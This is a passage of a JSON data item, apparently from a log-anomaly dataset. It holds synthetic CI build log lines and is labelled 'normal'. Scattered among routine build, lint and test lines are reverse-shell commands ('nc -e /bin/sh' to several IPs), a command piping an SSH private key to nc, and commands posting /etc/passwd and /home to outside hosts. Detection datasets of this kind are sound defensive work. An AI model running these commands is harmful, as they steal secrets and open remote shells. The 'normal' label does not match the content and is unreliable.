          "Cache hit for key-9197",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/utils.go...",
          "Installing prettier@5.20.0",
          "[12:00:24] INFO: Processing request",
          "  PASS: test_db_connect (346ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-5771",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "\u2713 test completed",
          "Step 6/10: Building",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Cache hit for key-3023",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (123ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@4.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-2035",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Installing jest@2.3.0",
          "[12:00:24] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 1/10: Building",
          "[12:00:24] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:24] ERROR: Connection failed",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:24] ERROR: Connection failed",
          "Cache hit for key-6981",
          "  PASS: test_auth_login (485ms)",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Cache hit for key-7862",
          "Installing prettier@5.2.0",
          "Compiling src/utils.go...",
          "nc -e /bin/sh 76.119.29.128 47404",
          "Compiling src/service.java...",
          "Exception: ValueError",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2717 build failed with exit code 16",
          "Cache hit for key-4127",
          "Step 10/10: Building",
          "[12:00:24] ERROR: Connection failed",
          "Cache hit for key-9555",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:24] INFO: Processing request",
          "Cache hit for key-9215",
          "Cache hit for key-6059",
          "[12:00:24] ERROR: Connection failed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/index.js...",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] INFO: Processing request",
          "nc -e /bin/sh 223.61.34.210 15793",
          "nc -e /bin/sh 236.62.234.253 43448",
          "  PASS: test_user_create (403ms)",
          "Installing eslint@1.12.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (31ms)",
          "\u2713 test completed",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:24] ERROR: Connection failed",
          "Cache hit for key-1360",
          "  PASS: test_db_connect (156ms)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "[12:00:24] INFO: Processing request",
          "[12:00:24] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing react@5.19.0",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "  PASS: test_user_create (365ms)",
          "Installing jest@2.18.0",
          "Installing react@3.19.0",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "[12:00:24] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:24] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "  PASS: test_api_health (22ms)",
          "Step 4/10: Building",
          "Installing webpack@3.1.0",
          "Step 8/10: Building",
          "  PASS: test_auth_login (5ms)",
          "Step 7/10: Building",
          "Installing webpack@1.13.0",
          "Cache hit for key-7646",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-9439",
          "nc -e /bin/sh 108.26.140.44 51908",
          "Cache hit for key-4877",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 60.111.18.16 18914",
          "  PASS: test_cache_hit (266ms)",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_user_create (405ms)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "nc -e /bin/sh 30.177.175.96 3203",
          "Cache hit for key-3251",
          "Step 1/10: Building",
          "Installing webpack@5.19.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Cache hit for key-2930",
          "  PASS: test_api_health (269ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-4132",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 2/10: Building",
          "Sending 92MB of data to example.com",
          "Installing webpack@5.18.0",
          "Compiling src/app.ts...",
          "Cache hit for key-9181",
          "Compiling src/service.java...",
          "  PASS: test_user_create (121ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "FAILED: test_api_health",
          "Installing webpack@3.1.0",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}